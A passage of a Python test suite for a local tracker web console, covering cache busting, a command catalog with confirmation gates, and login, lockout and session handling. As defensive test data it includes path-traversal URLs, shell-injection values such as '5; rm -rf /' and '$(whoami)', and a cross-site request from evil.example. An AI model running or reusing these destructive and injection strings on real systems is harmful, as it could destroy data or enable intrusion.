    row = listing["rows"][0]
    _status, payload = request(address, f"/api/project?id={row['id']}")
    page = payload["project"]

    # The row adds exactly one key of its own, and it is a count of what it dropped.
    assert set(row) - set(page) == {"n_sources"}
    assert set(page) - set(row) == set(LIST_OMITS) | {"sources"}

    reduced = {"risks", "standing", "n_sources"}
    for key in (set(page) & set(row)) - reduced:
        assert page[key] == row[key], key

    # The three keys the row carries in reduced form still say the same thing.
    assert row["n_sources"] == len(page["sources"])
    assert [{k: r[k] for k in RISK_LIST_FIELDS} for r in page["risks"]] == row["risks"]
    assert set(page["standing"]) - set(row["standing"]) == set(STANDING_OMITS)
    for key in row["standing"]:
        assert page["standing"][key] == row["standing"][key], key


def test_static_refuses_to_escape_its_root(server):
    address, _ = server
    for attempt in (
        "/static/../../cli.py",
        "/static/..%2f..%2fcli.py",
        "/static/vendor/../../db.py",
    ):
        status, _ = request(address, attempt)
        assert status == 404, f"{attempt} was served"


# --- cache busting -----------------------------------------------------------
#
# Static files were served at bare URLs. The server had no way to tell a browser
# — or a CDN edge in front of a published console — that `app.js` had changed, so
# a restart could leave the operator looking at last week's front end while every
# check on the server side said the new code was being served. It happened, and
# it cost a round trip to work out that nothing was wrong with the code.


def test_the_page_stamps_every_asset_with_its_version(server):
    address, _ = server
    status, body = request(address, "/")
    assert status == 200
    for asset in ("/static/app.js", "/static/app.css", "/static/vendor/react.js"):
        assert f"{asset}?v=" in body, f"{asset} is referenced without a version"
    assert '"/static/app.js"' not in body, "an unstamped reference survived"


def test_editing_a_file_changes_the_url_it_is_served_at(server, tmp_path):
    """The whole point: a changed file cannot be served from anybody's cache."""
    from tracker.webui import assets

    address, _ = server
    target = assets.STATIC_ROOT / "app.css"
    before = assets.version_token(target)
    original = target.read_bytes()
    try:
        target.write_bytes(original + b"\n/* touched */\n")
        assert assets.version_token(target) != before
        _, body = request(address, "/")
        assert f"app.css?v={assets.version_token(target)}" in body
    finally:
        target.write_bytes(original)


def test_a_current_token_is_cacheable_and_anything_else_is_not(server):
    """`immutable` is only safe because the URL changes when the file does.

    Sent for a stale or absent token it would strand a browser on an old bundle,
    which is the failure this whole mechanism exists to prevent.
    """
    from tracker.webui import assets

    address, _ = server
    token = assets.version_token(assets.STATIC_ROOT / "app.js")

    fresh = headers_for(address, f"/static/app.js?v={token}")
    assert "immutable" in fresh.get("cache-control", "")

    for path in ("/static/app.js", "/static/app.js?v=stale-1"):
        assert "immutable" not in headers_for(address, path).get("cache-control", ""), path


def test_the_page_itself_is_never_cached(server):
    """It carries the tokens, so a cached copy would pin every asset with it."""
    address, _ = server
    assert "no-store" in headers_for(address, "/").get("cache-control", "")


def test_stamping_leaves_an_unknown_asset_alone():
    """A reference to a file that is not there must not gain a fake version."""
    from tracker.webui import assets

    html = '<script src="/static/nope.js"></script>'
    assert assets.stamp(html) == html


def test_a_missing_file_still_yields_a_token():
    """Called during a render; raising there would blank the page over nothing."""
    from tracker.webui import assets

    assert assets.version_token(assets.STATIC_ROOT / "not-a-file.js") == "0"


def test_unknown_route_is_a_404_not_a_traceback(server):
    address, _ = server
    status, body = request(address, "/api/nope")
    assert status == 404
    assert "error" in body


# --- the catalog ------------------------------------------------------------


def test_catalog_hides_commands_that_are_not_commands():
    """`_print_standing` was once registered by a stray decorator.

    Anything whose name is not a word is a CLI bug rather than something to
    offer, and the palette must not surface it.
    """
    names = set(catalog.by_name())
    assert not [n for n in names if n.startswith(("_", "-"))]
    assert {"sync", "gaps", "ingest crawl"} <= names


def test_catalog_marks_what_spends_money():
    commands = catalog.by_name()
    assert commands["sync"].cost == "llm"
    assert commands["ingest crawl"].cost == "llm"
    assert commands["gaps"].cost == "free"
    # One LLM call per filing, exactly like an article. It shipped outside
    # LLM_COMMANDS and so ran from the console with no confirmation at all.
    assert commands["ingest edgar"].cost == "llm"


def test_catalog_marks_what_destroys_data():
    """A separate axis from cost, because they are separate losses.

    `merge` spends nothing and is the only command in the console that cannot be
    undone. Reporting that as "spends LLM tokens" would be false, and leaving it
    ungated made a misplaced click delete project rows.
    """
    commands = catalog.by_name()
    merge = commands["merge"]
    assert merge.cost == "free"
    assert merge.destroys and "no undo" in merge.destroys
    assert merge.needs_confirmation
    assert commands["duplicates"].destroys is None  # it only reports
    assert commands["gaps"].needs_confirmation is False


def test_a_destructive_command_needs_its_name_typed_back(seeded_db):
    """The same ritual as an LLM command, for a different reason."""
    runner = Runner(seeded_db)
    with pytest.raises(catalog.InvalidRequest) as exc:
        runner.start("merge", {"--into": 1, "dupe_ids": [2]})
    assert "no undo" in str(exc.value)

    with pytest.raises(catalog.InvalidRequest) as exc:
        runner.start("merge", {"--into": 1, "dupe_ids": [2]}, confirm="yes")
    assert "no undo" in str(exc.value)


def test_the_gate_is_on_the_command_not_its_flags(seeded_db):
    """`--dry-run` must not talk its way past the confirmation.

    A gate that inspects arguments is a gate with a bypass in it: the flag that
    makes the run harmless today is one refactor away from not doing so, and the
    console would have already let the request through.
    """
    runner = Runner(seeded_db)
    with pytest.raises(catalog.InvalidRequest):
        runner.start("merge", {"--into": 1, "dupe_ids": [2], "--dry-run": True})


def test_every_command_the_palette_offers_is_in_a_named_group():
    """`GROUPS` is the one hand-written thing in the catalog, so it falls behind.

    It did: `capex`, `duplicates`, `merge` and `ingest edgar` all arrived and all
    landed in the unnamed "Other" bucket at the bottom of the palette. Only the
    blocked commands belong there — they are listed so their argv can be copied,
    not because anybody groups them.
    """
    grouped = catalog.grouped_json()
    other = [c["cmd"] for g in grouped if g["group"] == "Other" for c in g["items"]]
    assert set(other) <= set(catalog.BLOCKED), f"ungrouped commands: {sorted(other)}"


def test_argv_is_a_list_built_from_the_catalog():
    argv = catalog.build_argv("sync", {"--limit": 5, "--deep": True})
    assert argv[1:] == ["-m", "tracker", "sync", "--limit", "5", "--deep"]


@pytest.mark.parametrize(
    ("cmd", "flags", "expect"),
    [
        ("nope", {}, "unknown command"),
        ("gaps", {"--nope": 1}, "no flag"),
        ("export", {"--out": "/etc/passwd"}, "no flag"),
        ("sync", {"--limit": "5; rm -rf /"}, "must be a number"),
        ("sync", {"--limit": "$(whoami)"}, "must be a number"),
        ("list", {"--phase": "bogus"}, "must be one of"),
        ("serve", {}, "cannot be run from the console"),
    ],
)
def test_catalog_refuses_what_it_does_not_know(cmd, flags, expect):
    with pytest.raises(catalog.InvalidRequest) as exc:
        catalog.build_argv(cmd, flags)
    assert expect in str(exc.value)


def test_a_repeatable_flag_takes_a_list_and_repeats_itself():
    """The Queue's per-article Crawl button needs exactly one URL through.

    `--url` is `list[str]` on the CLI, so click marks it `multiple` and the
    catalog reads that rather than keeping its own list of which flags repeat.
    """
    one = catalog.build_argv("ingest crawl", {"--url": "https://a.example/x"})
    assert one[-2:] == ["--url", "https://a.example/x"]
    many = catalog.build_argv(
        "ingest crawl", {"--url": ["https://a.example/x", "https://b.example/y"]}
    )
    assert many[-4:] == ["--url", "https://a.example/x", "--url", "https://b.example/y"]


def test_a_variadic_positional_takes_a_list_of_ids():
    """The Duplicates card sends a whole group in one request.

    `merge` takes any number of ids as bare arguments, which click models as
    `nargs=-1` rather than as a `multiple` option. Reading only `multiple` refused
    the list and the card could never have folded more than one row.
    """
    argv = catalog.build_argv("merge", {"--into": 3, "dupe_ids": [8, 93, 121]})
    assert argv[1:] == ["-m", "tracker", "merge", "--into", "3", "8", "93", "121"]
    # Options first, positionals last: `merge --into 3 8 93 121` parses, and
    # `merge 8 93 121 --into 3` would swallow the option as an argument.
    assert argv.index("--into") < argv.index("8")


@pytest.mark.parametrize("cmd,flag", [("ingest crawl", "--prompt"), ("sync", "--limit")])
def test_a_list_is_refused_where_the_cli_takes_one_value(cmd, flag):
    """Otherwise it stringifies to "['a', 'b']" and goes through as one argument."""
    with pytest.raises(catalog.InvalidRequest) as exc:
        catalog.build_argv(cmd, {flag: ["a", "b"]})
    assert "single value" in str(exc.value)


def test_crawling_one_url_still_needs_the_confirmation(seeded_db):
    """The button is two-step in the UI; the server rule behind it is unchanged."""
    runner = Runner(seeded_db)
    with pytest.raises(catalog.InvalidRequest) as exc:
        runner.start("ingest crawl", {"--url": "https://a.example/x"})
    assert "spends LLM tokens" in str(exc.value)


def test_a_shell_metacharacter_that_survives_is_still_only_one_argument():
    """Text flags accept anything; it just never becomes shell syntax.

    `--company` is a substring filter, so `;` in it is legitimate input. The
    guarantee is not that the value is sanitised — it is that argv is a list and
    no shell ever sees it.
    """
    argv = catalog.build_argv("list", {"--company": "Micro; rm -rf /"})
    assert argv[-2:] == ["--company", "Micro; rm -rf /"]
    assert not any(part == ";" for part in argv)


# --- the runner -------------------------------------------------------------


def test_an_llm_command_needs_its_name_typed_back(seeded_db):
    runner = Runner(seeded_db)
    with pytest.raises(catalog.InvalidRequest) as exc:
        runner.start("sync", {"--limit": 1})
    assert "spends LLM tokens" in str(exc.value)
    with pytest.raises(catalog.InvalidRequest):
        runner.start("sync", {"--limit": 1}, confirm="yes")


def test_a_second_run_is_refused_rather_than_queued(seeded_db, monkeypatch):
    """SQLite takes one writer; a second run would die partway through."""
    runner = Runner(seeded_db)
    runner._current = type("R", (), {"status": "running", "cmd": "sync"})()
    with pytest.raises(Busy) as exc:
        runner.start("gaps", {})
    assert "still running" in str(exc.value)


def test_writing_a_briefing_costs_money_and_says_so(server):
    """A POST, and gated, because a GET that spends money is a GET a back button
    will make twice."""
    address, _ = server
    status, body = request(address, "/api/overview", "POST", {"project_id": 1})
    assert status == 400
    assert 'confirm="overview"' in body["error"]


@pytest.mark.parametrize(
    ("payload", "status", "expect"),
    [
        ({"project_id": 99999, "confirm": "overview"}, 404, "no project"),
        ({"project_id": "nine"}, 400, "must be an integer"),
        ({}, 400, "must be an integer"),
    ],
)
def test_the_briefing_route_refuses_what_it_cannot_answer(server, payload, status, expect):
    address, _ = server
    got_status, body = request(address, "/api/overview", "POST", payload)
    assert got_status == status
    assert expect in body["error"]


def test_a_briefing_already_written_needs_no_confirmation(server, seeded_db):
    """It has been paid for; making somebody re-confirm to reread it is theatre."""
    from tracker import overview as overview_mod
    from tracker.db import open_db
    from tracker.models import Project

    class _Writer:
        def complete(self, *, system, user, max_tokens):
            class R:
                text = "A short briefing about this campus, long enough to be kept."
                model = "test-model"

            return R()

    with session_scope(open_db(seeded_db), commit=False) as session:
        overview_mod.write(session.get(Project, 1), extractor=_Writer())

    address, _ = server
    status, body = request(address, "/api/overview", "POST", {"project_id": 1})
    assert status == 200
    assert body["cached"] is True
    assert "short briefing" in body["text"]


def test_apologising_to_a_dead_socket_does_not_raise_again():
    """`_error` is called from inside `except` blocks, so it must not throw.

    This is the second traceback in the original report. The stream aborted, the
    catch-all handler tried to send a 500, and writing that 500 down the same dead
    socket raised again — this time out of an exception handler, where nothing was
    left to catch it, so it escaped to socketserver.

    Driven directly rather than through a real socket: the behavioural test below
    cannot reliably win the race between a fast command finishing and the client
    disappearing, and a test that only sometimes exercises the bug is not a test.
    """
    import io

    from tracker.webui.server import Handler

    class DeadSocket(io.RawIOBase):
        def write(self, b):
            raise ConnectionAbortedError(10053, "aborted by the host software")

        def writable(self) -> bool:
            return True

    handler = object.__new__(Handler)
    handler.wfile = DeadSocket()
    handler.headers = {}
    handler.command = "GET"
    handler.request_version = "HTTP/1.1"
    handler.requestline = "GET /x HTTP/1.1"
    handler.client_address = ("127.0.0.1", 1)
    handler.server = None

    handler._error(500, "internal error")  # must not raise


def test_a_client_that_hangs_up_between_requests_is_not_a_traceback(seeded_db):
    """The stdlib reads the next request line before any `do_*` method runs.

    So a peer that resets a keep-alive connection between requests — a tab closed,
    a client that closes with part of a response unread — raised out of
    `readline`, past every handler here, and socketserver printed "Exception
    occurred during processing of request" with a traceback for it. Observed in
    this suite as ConnectionAbortedError [WinError 10053], from a test that reads
    a response's headers and closes the socket on its body.
    """
    import socket
    import struct
    from http.server import ThreadingHTTPServer

    class Recording(ThreadingHTTPServer):
        daemon_threads = True

        def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            self.errors: list[BaseException | None] = []
            self.finished = threading.Event()

        def handle_error(self, request, client_address):
            self.errors.append(sys.exc_info()[1])

        def process_request_thread(self, request, client_address):
            try:
                super().process_request_thread(request, client_address)
            finally:
                self.finished.set()

    console = Console(seeded_db)
    httpd = Recording(("127.0.0.1", 0), type("Bound", (Handler,), {"console": console}))
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        sock = socket.create_connection(httpd.server_address, timeout=10)
        sock.sendall(b"GET /api/health HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n")
        assert sock.recv(64).startswith(b"HTTP/1.1 200")
        # Linger zero: close with a reset rather than a FIN, which is what an
        # abandoned keep-alive socket turns into.
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
        sock.close()
        assert httpd.finished.wait(10), "the connection's thread never ended"
        assert httpd.errors == [], f"socketserver was handed {httpd.errors}"
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def test_every_connection_failure_windows_can_raise_is_caught():
    """`ConnectionError` covers all of them; the old tuple covered two of four.

    Guards the fix by construction rather than by hoping a test happens to
    provoke the right errno on the right platform.
    """
    for kind in (
        BrokenPipeError,
        ConnectionResetError,
        ConnectionAbortedError,
        ConnectionRefusedError,
    ):
        assert issubclass(kind, ConnectionError)

    source = (assets.STATIC_ROOT.parent / "server.py").read_text(encoding="utf-8")
    assert "except (BrokenPipeError, ConnectionResetError)" not in source
    # A client that stopped reading is the same case as one that left, now that
    # the socket has a timeout, so the clause names both.
    caught = source.count("except (ConnectionError, TimeoutError)")
    assert caught >= 3, "_error, do_GET and do_POST"


def test_a_run_targets_the_database_the_console_is_serving(seeded_db, tmp_path):
    """The child must be told which database, not left to resolve a default.

    `--db` is blocked as a request flag so a caller cannot redirect a run; the
    runner therefore has to inject it. Without this a run started from a console
    opened on one database silently operated on whichever one its working
    directory implied.
    """
    argv = catalog.build_argv("gaps", {}, db_path=seeded_db)
    assert argv[1:4] == ["-m", "tracker", "--db"]
    assert argv[4] == str(seeded_db)
    assert argv[5] == "gaps"


# --- colour -----------------------------------------------------------------


@pytest.fixture(scope="module")
def colour_db(tmp_path_factory) -> str:
    """A database at this checkout's own schema version, for the colour probes.

    They are the only tests here that shell out to the real CLI, and without a
    database of their own they read the developer's `data/tracker.db`. That one
    goes stale the moment a migration lands: `gaps` then refuses to run, prints
    the refusal to *stderr*, and leaves stdout empty.

    Which breaks these three asymmetrically, and that is the part worth guarding
    against. Empty output has no escape sequences in it, so the probe asserting
    colour is present fails loudly — while the two asserting colour is *absent*
    keep passing, having checked nothing at all. Landing migrations 0011-0013 did
    exactly this, and only one of the three said so.

    Empty is enough; `gaps` prints a coloured "database is empty" line, so there
    is nothing to seed.
    """
    from tracker.db import init_db

    path = tmp_path_factory.mktemp("colour") / "tracker.db"
    init_db(path)
    return str(path)


def _run_gaps(db: str, extra_env: dict[str, str], drop: tuple[str, ...] = ()) -> str:
    import subprocess

    env = {
        **os.environ,
        "COLUMNS": "160",
        "PYTHONIOENCODING": "utf-8",
        "TRACKER_DB": db,
        **extra_env,
    }
    for key in drop:
        env.pop(key, None)
    result = subprocess.run(
        [sys.executable, "-m", "tracker", "gaps"],
        capture_output=True,
        text=True,
        encoding="utf-8",
        env=env,
        timeout=120,
    )
    # A command that refused to run says so on stderr and prints nothing here,
    # which would satisfy both "is not coloured" assertions below for entirely
    # the wrong reason.
    assert result.stdout.strip(), f"`tracker gaps` printed nothing; stderr: {result.stderr!r}"
    return result.stdout


SGR = re.compile(r"\x1b\[[0-9;]*m")


def test_forcing_colour_actually_produces_escapes(colour_db):
    """`FORCE_COLOR` alone is not enough on Windows, and it fails silently.

    Rich honours it — `is_terminal` goes True — and then picks
    `ColorSystem.WINDOWS`, which paints via the console API rather than writing
    escapes. Down a pipe that API does nothing, so the markup is stripped and
    nothing replaces it. `cli._forced_colour` names an ANSI dialect to fix it;
    this asserts the fix rather than the flag.
    """
    out = _run_gaps(colour_db, {"FORCE_COLOR": "1", "COLORTERM": "truecolor"}, drop=("NO_COLOR",))
    assert SGR.search(out), "colour was forced and no escape sequences came out"


def test_piping_without_asking_stays_plain(colour_db):
    """The default has not changed: `tracker gaps > file` is still plain text."""
    out = _run_gaps(colour_db, {}, drop=("FORCE_COLOR", "NO_COLOR"))
    assert not SGR.search(out)


def test_no_color_beats_force_color(colour_db):
    """https://no-color.org — set means no colour, whatever else was asked for."""
    out = _run_gaps(colour_db, {"FORCE_COLOR": "1", "NO_COLOR": "1"})
    assert not SGR.search(out)


def test_the_runner_asks_for_colour_and_removes_what_would_suppress_it(monkeypatch):
    """The env the runner builds, read as a value rather than as its own source."""
    from tracker.webui import runner as runner_mod

    # Both of these suppress colour even when it has been forced, so inheriting
    # one from the operator's shell would silently undo the whole mechanism.
    monkeypatch.setenv("NO_COLOR", "1")
    monkeypatch.setenv("TTY_COMPATIBLE", "0")

    # Inherited, never rewritten. An earlier version set TERM=dumb, which makes
    # Rich a dumb terminal and kills the colour whatever else has been forced.
    monkeypatch.setenv("TERM", "xterm-256color")

    env = runner_mod._child_env()
    assert env["FORCE_COLOR"] == "1"
    assert env["COLORTERM"] == "truecolor"
    assert "NO_COLOR" not in env
    assert "TTY_COMPATIBLE" not in env
    assert env["TERM"] == "xterm-256color"


def test_the_child_is_told_how_wide_its_reader_is():
    """Rich wraps to COLUMNS, so the caller has to pass the truth.

    The TUI's log is whatever the window is; the console's wraps in CSS and keeps
    the default. Getting this wrong breaks every long line twice — once at the
    width the child was told and again at the width it is displayed in, with the
    second break landing mid-sentence.
    """
    from tracker.webui import runner as runner_mod

    assert runner_mod._child_env()["COLUMNS"] == str(runner_mod.DEFAULT_COLUMNS)
    assert runner_mod._child_env(96)["COLUMNS"] == "96"


# --- the gate ---------------------------------------------------------------

PASSWORD = "correct horse battery"
EMAIL = "reader@example.com"


def _account(db_path, email=EMAIL, password=PASSWORD):
    """One account in `db_path`, created the way the CLI creates one."""
    from tracker import accounts
    from tracker.db import open_db, session_scope

    with session_scope(open_db(db_path, readonly=False)) as session:
        return accounts.create(session, email, password).id


@pytest.fixture
def gated(seeded_db):
    """A console with one account on it, on an ephemeral loopback port.

    **An account is what closes the gate**, where a password used to be. There is
    no flag for it: the server counts rows, so a test that wants an open console
    simply does not make one — see `test_no_accounts_means_no_gate`.
    """
    from http.server import ThreadingHTTPServer

    _account(seeded_db)
    console = Console(seeded_db)
    handler = type("Bound", (Handler,), {"console": console})
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    httpd.daemon_threads = True
    threading.Thread(target=httpd.serve_forever, kwargs=FAST_POLL, daemon=True).start()
    try:
        yield httpd.server_address, console
    finally:
        httpd.shutdown()
        httpd.server_close()
        console.close()


def raw(address, path, method="GET", body=None, cookie=None, headers=None):
    """A request that keeps the response headers, for cookie assertions."""
    conn = HTTPConnection(*address, timeout=30)
    head = {"Content-Type": "application/json", **(headers or {})}
    if cookie:
        head["Cookie"] = cookie
    conn.request(method, path, body=json.dumps(body) if body is not None else None, headers=head)
    response = conn.getresponse()
    payload = response.read().decode("utf-8")
    result = (response.status, dict(response.getheaders()), payload)
    conn.close()
    return result


def sign_in(address, password=PASSWORD, email=EMAIL):
    status, headers, _ = raw(address, "/api/login", "POST", {"email": email, "password": password})
    cookie = headers.get("Set-Cookie", "").split(";")[0]
    return status, cookie


@pytest.mark.parametrize(
    "path",
    [
        "/api/dataset",
        "/api/updates",
        "/api/claims",
        "/api/health",
        "/static/app.js",
        "/static/app.css",
    ],
)
def test_nothing_is_served_before_signing_in(gated, path):
    """Blanket, not just the page.

    An anonymous request reaches exactly one file. Serving the app bundle or a
    health check to the open internet would leak the shape of what is behind the
    gate for no benefit.
    """
    address, _ = gated
    status, _, body = raw(address, path)
    assert status == 401, f"{path} was served to an anonymous request"
    assert "sign in" in body
    # And specifically not the asset itself.
    assert "React" not in body and "dc-tracker console" not in body


def test_a_navigation_gets_the_form_but_an_asset_gets_a_401(gated):
    """Both withhold the asset; only one of them is usable.

    Answering a request for `app.js` with the login page and a 200 hands a
    browser HTML where it asked for a script, so an expired session surfaces as a
    parse error rather than as "you are signed out".
    """
    address, _ = gated
    status, _, body = raw(address, "/")
    assert status == 200 and "Sign in" in body
    assert raw(address, "/static/app.js")[0] == 401


def test_the_login_page_leaks_nothing(gated):
    address, _ = gated
    _, _, body = raw(address, "/")
    for leak in ("Fairwater", "Microsoft", "/api/dataset", "vendor/", "tracker serve"):
        assert leak not in body, f"the login page mentions {leak}"


def test_signing_in_sets_an_httponly_lax_session_cookie(gated):
    address, _ = gated
    status, headers, _ = raw(address, "/api/login", "POST", {"email": EMAIL, "password": PASSWORD})
    assert status == 200
    cookie = headers["Set-Cookie"]
    assert "HttpOnly" in cookie, "a script must not be able to read the session"
    assert "SameSite=Lax" in cookie, "this is what blocks a cross-site POST to /api/watch"
    assert "Path=/" in cookie
    # Not marked Secure here: the test connection is plain http, and marking it
    # Secure would mean the browser never sent it back.
    assert "Secure" not in cookie


def test_a_session_opens_every_route(gated):
    address, _ = gated
    _, cookie = sign_in(address)
    for path in ("/api/dataset", "/api/updates", "/api/health", "/static/app.js"):
        status, _, _ = raw(address, path, cookie=cookie)
        assert status == 200, path
    status, _, body = raw(address, "/", cookie=cookie)
    assert "Redeem an invite" not in body, "still on the login page"


def test_a_wrong_password_is_401_and_grants_nothing(gated):
    address, _ = gated
    status, cookie = sign_in(address, "wrong")
    assert status == 401
    assert not cookie
    assert raw(address, "/api/dataset")[0] == 401


def test_a_forged_cookie_is_not_a_session(gated):
    address, _ = gated
    from tracker.webui.auth import COOKIE

    for forged in (f"{COOKIE}=x", f"{COOKIE}=", f"{COOKIE}=" + "a" * 43, "other=1"):
        assert raw(address, "/api/dataset", cookie=forged)[0] == 401


def test_signing_out_revokes_the_session(gated):
    address, _ = gated
    _, cookie = sign_in(address)
    assert raw(address, "/api/dataset", cookie=cookie)[0] == 200
    assert raw(address, "/api/logout", "POST", {}, cookie=cookie)[0] == 200
    assert raw(address, "/api/dataset", cookie=cookie)[0] == 401


def test_a_cross_site_post_is_refused(gated):
    """Second lock. SameSite=Lax is the first, but it lives in the browser."""
    address, _ = gated
    _, cookie = sign_in(address)
    status, _, body = raw(
        address,
        "/api/watch",
        "POST",
        {"action": "add", "entry": "xAI"},
        cookie=cookie,
        headers={"Origin": "https://evil.example"},
    )
    assert status == 403
    assert "cross-site" in body


def test_repeated_failures_lock_the_gate(gated):
    """A published URL means an unattended login form.

    A short password is only safe if guessing is slow. Eight tries then fifteen
    minutes makes even a small keyspace unreachable, and the lockout says so
    rather than repeating "wrong password" at someone who mistyped.
    """
    address, console = gated
    for _ in range(console.gate.max_failures):
        assert sign_in(address, "wrong")[0] == 401
    status, _, body = raw(address, "/api/login", "POST", {"email": EMAIL, "password": "wrong"})
    assert status == 429
    assert "Locked" in body
    # And the lockout holds even for the right password, or it is not a lockout.
    assert raw(address, "/api/login", "POST", {"email": EMAIL, "password": PASSWORD})[0] == 429


def test_the_gate_closes_globally_not_just_per_client(gated):
    """Per-client lockout alone is the wrong shape against a published URL.

    The counter keys on `CF-Connecting-IP`, so an attacker with a thousand
    addresses would get a thousand budgets. The global counter is what makes the
    guess rate a property of the gate rather than of the address pool — and it is
    what lets a short password be safe.
    """
    address, console = gated
    limit = console.gate.global_max_failures
    for i in range(limit):
        # A different client every time: the per-client limit is never reached.
        raw(
            address,
            "/api/login",
            "POST",
            {"email": EMAIL, "password": "wrong"},
            headers={"CF-Connecting-IP": f"203.0.113.{i % 250}"},
        )
    status, _, body = raw(
        address,
        "/api/login",
        "POST",
        {"email": EMAIL, "password": PASSWORD},
        headers={"CF-Connecting-IP": "198.51.100.7"},
    )
    assert status == 429, "a fresh address walked straight past the lockout"
    assert "Locked" in body


def test_signing_in_as_yourself_does_not_buy_more_guesses(gated):
    """A correct password used to reset the *global* counter as well as the client's.

    The reasoning was "a right password says the traffic is not an attack", and it
    only says that about one client. Anybody holding an account could guess seven
    times at other people's passwords, sign in as themselves, and repeat — never
    reaching the per-client limit of eight and resetting the global forty every
    time, so their guessing had no limit at all. A success now forgets that
    client's own failures and nothing else. Scaled down from 8 and 40 so the test
    does not spend a minute hashing.
    """
    address, console = gated
    gate = console.gate
    gate.max_failures, gate.global_max_failures = 4, 10

    guesses = 0
    while guesses < gate.global_max_failures:
        for _ in range(gate.max_failures - 1):  # always one short of the lockout
            if guesses == gate.global_max_failures:
                break
            body = {"email": "someone-else@example.com", "password": f"guess {guesses}"}
            assert raw(address, "/api/login", "POST", body)[0] == 401
            guesses += 1
        if guesses < gate.global_max_failures:
            assert sign_in(address)[0] == 200, "as themselves"

    body = {"email": "someone-else@example.com", "password": "one more"}
    assert raw(address, "/api/login", "POST", body)[0] == 429


def test_an_old_fumble_ages_out_of_the_global_window():
    """What the reset-on-success was standing in for, done properly.

    "One person fumbling twice must not spend everyone's budget" is still the rule
    — it is why a success used to clear the global counter. A window keeps it
    without the hole: failures count towards the global limit for
    `GLOBAL_WINDOW_S` and then stop counting, so the documented rate — forty
    attempts per fifteen minutes — is what the gate actually enforces, and a
    typo on Monday cannot help close the gate on Thursday.
    """
    from tracker.webui.auth import Gate

    now = [0.0]
    gate = Gate(clock=lambda: now[0], max_failures=100, global_max_failures=3, global_window_s=60)
    gate.fail("a")
    gate.fail("b")
    now[0] += 61
    gate.fail("c")
    assert gate.locked_for("anyone") == 0, "two of the three were outside the window"

    gate.fail("d")
    gate.fail("e")
    assert gate.locked_for("anyone") > 0, "three inside it"


def test_a_success_forgets_only_its_own_clients_failures():
    from tracker.webui.auth import Gate

    now = [0.0]
    gate = Gate(clock=lambda: now[0], max_failures=3, global_max_failures=100)
    for client in ("x", "x", "y", "y"):
        gate.fail(client)
    gate.succeed("x")

    assert gate.recent_failures() == 4, "nothing forgotten across the gate"
    gate.fail("y")
    assert gate.locked_for("y") > 0, "y's own count survived x's success"
    assert gate.locked_for("x") == 0


def test_signing_in_works_while_a_command_is_writing(gated, seeded_db):
    """A crawl holds SQLite's write lock for as long as each of its transactions.

    Sign-in wrote `last_seen_at` with the five-second busy timeout and did not catch
    "database is locked", so the right password sat out five seconds and then got
    a 500. The credential check only reads, and WAL readers are never blocked by a
    writer; the stamp is the part that can wait, and it no longer makes the reader
    wait with it.
    """
    import sqlite3
    import time as clock

    address, _ = gated
    holder = sqlite3.connect(seeded_db, timeout=0)
    holder.execute("BEGIN IMMEDIATE")  # what a CLI command's write transaction holds
    try:
        started = clock.monotonic()
        status, cookie = sign_in(address)
        elapsed = clock.monotonic() - started
        assert status == 200, "the right password was refused because a command was writing"
        assert raw(address, "/api/dataset", cookie=cookie)[0] == 200
    finally:
        holder.rollback()
        holder.close()
    assert elapsed < 3, f"the sign-in sat out the busy timeout ({elapsed:.1f}s)"


def test_a_sign_in_still_records_when_it_happened(gated, seeded_db):
    """The stamp is skipped only when the database is busy, not dropped."""
    from tracker import accounts
    from tracker.db import open_db, session_scope

    address, _ = gated
    assert sign_in(address)[0] == 200
    with session_scope(open_db(seeded_db), commit=False) as session:
        assert accounts.by_email(session, EMAIL).last_seen_at is not None


def test_no_accounts_means_no_gate(server):
    """Loopback default: reaching 127.0.0.1 already means having the machine.

    This replaced "no password configured", and the shape of the answer changed
    with it: there is no flag to read, so the server counts rows. `seeded_db` has
    no accounts on it, which is why `server` opens straight in and `gated` — the
    same fixture plus one account — does not.
    """
    address, console = server
    assert console.auth_required is False
    assert request(address, "/api/dataset")[0] == 200


def test_creating_an_account_closes_the_gate_without_a_restart(server, seeded_db):
    """`tracker users add` runs in another process.

    A flag read at startup would leave a published console open until somebody
    restarted it, which is the trap `Console.auth_required` exists to avoid. The
    staleness window is `AUTH_CACHE_S`, reached past here rather than waited out:
    sleeping five seconds per run to prove a cache exists is a bad trade.
    """
    address, console = server
    assert request(address, "/api/dataset")[0] == 200

    _account(seeded_db)
    console._auth_checked_at = 0.0  # the cache, expired
    assert console.auth_required is True
    assert request(address, "/api/dataset")[0] == 401


def _delete_account(db_path, email=EMAIL):
    """`tracker users rm`, as the CLI does it: another connection, another process."""
    from tracker import accounts
    from tracker.db import open_db, session_scope

    with session_scope(open_db(db_path, readonly=False)) as session:
        assert accounts.delete(session, email), f"no account {email} to delete"


@pytest.mark.parametrize(
    "path",
    [
        "/api/projects",
        "/api/project?id=1",
        "/api/claims?project=1",
        "/api/updates",
        "/api/articles",
        "/api/dataset",
        "/api/health",
        "/static/app.js",
    ],
)
def test_a_deleted_account_stops_reading_on_its_next_request(gated, seeded_db, path):
    """`tracker users rm` runs in another process and cannot reach the gate's table.

    Measured on a copy of production before this was fixed: with the account row
    gone, its session kept getting 200 from `/api/projects`, `/api/project`,
    `/api/claims`, `/api/updates` and `/api/articles` for the rest of its 12-hour
    life. Only `/api/dataset` looked the account up, so only the landing page ever
    noticed. Every route now confirms the session against the row.

    `session_confirm_s` is reached past rather than waited out, for the reason
    `test_creating_an_account_closes_the_gate_without_a_restart` gives.
    """
    address, console = gated
    console.gate.session_confirm_s = 0
    _, cookie = sign_in(address)
    assert raw(address, path, cookie=cookie)[0] == 200, "the fixture must read first"

    _delete_account(seeded_db)
    status, _, _ = raw(address, path, cookie=cookie)
    assert status == 401, f"{path} still served an account that no longer exists"


def test_a_deleted_accounts_session_is_dropped_not_merely_refused(gated, seeded_db):
    """Refusing the request and keeping the token would leave it in the table for
    twelve hours, one database read per request, for nobody."""
    address, console = gated
    console.gate.session_confirm_s = 0
    _, cookie = sign_in(address)
    token = cookie.split("=", 1)[1]
    assert console.gate.session_for(token) is not None

    _delete_account(seeded_db)
    raw(address, "/api/health", cookie=cookie)
    assert console.gate.session_for(token) is None


